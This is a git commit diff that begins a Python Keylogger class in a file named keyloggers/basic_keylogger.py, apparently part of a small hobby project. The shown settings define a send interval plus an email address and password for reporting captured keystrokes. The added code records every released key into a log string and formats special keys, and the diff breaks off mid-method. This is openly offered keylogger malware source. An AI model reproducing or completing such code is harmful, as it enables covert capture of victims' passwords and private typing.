085bad769b9a4b2ef3a70e151bb7faa8af239b9e
jroller33 <jtroller33@gmail.com>
2023-07-06 20:03:50 -0500

    started on Keylogger class

--- keyloggers/basic_keylogger.py
+++ keyloggers/basic_keylogger.py
@@ -16,3 +16,36 @@ SEND_INTERVAL = 120 # number of seconds to send the string
 EMAIL_ADDRESS = "dwight.schrute@dundermifflin.com"
 EMAIL_PASSWORD = "bearsbeetsbattlestargalactica"
 
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
+
+        self.log = ""   # stores the keystrokes
+
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        # this is called whenever a key is released
+        name = event.name
+
+        if len(name) > 1:
+
+            if name == "space":
+                name = " "
+
+            elif name == "enter":
+                name = "[ENTER]\n"
+
+            elif name == "decimal":
+                name = "."
+
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        
+        self.log += name
+
+    def update_filename(self):
+        
